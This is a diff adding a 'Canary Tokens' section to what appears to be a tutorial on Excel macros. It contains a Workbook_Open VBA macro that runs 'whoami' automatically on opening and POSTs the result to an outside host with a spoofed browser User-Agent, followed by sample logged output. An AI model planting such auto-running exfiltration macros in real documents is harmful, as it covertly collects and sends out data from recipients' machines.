@@ -56,5 +56,38 @@ End Sub
 
 ```
 
+### Integrating Canary Tokens
 
+Canary Tokens are a way to track an IP address when they do a certain task. This could be accessing a website or even requesting a DNS hostname. We can use the previous code and incorporate a Canary Token into it.
+
+```csharp
+Sub Workbook_Open()
+    Set Excel_Shell = CreateObject("WScript.Shell")
+    Set Excel_Shell_Exec = Excel_Shell.Exec("whoami")
+    'Source: https://stackoverflow.com/questions/158633/how-can-i-send-an-http-post-request-to-a-server-from-excel-using-vba'
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+    Url = "http://canarytokens.com/static/about/your_own_token/contact.php"
+    objHTTP.Open "POST", Url, False
+    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+    objHTTP.send ("Systeminfo: " + Excel_Shell_Exec.StdOut.ReadAll)
+End Sub
+
+```
+
+In line 6, we can see the canary token being used. Once we access the token, it then sends the information to the email or webhook we have used initially. Our output should look like this:
+
+```csharp
+{
+  "manage_url": "https://canarytokens.org/manage?token=Took_this_out&auth=Took_this_out",
+  "memo": "Website Accessed ",
+  "additional_data": {
+    "src_ip": "Your IP",
+    "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+    "referer": null,
+    "location": null
+  },
+  "channel": "HTTP",
+  "time": "2021-03-07 20:25:36 (UTC)"
+}
+```
 
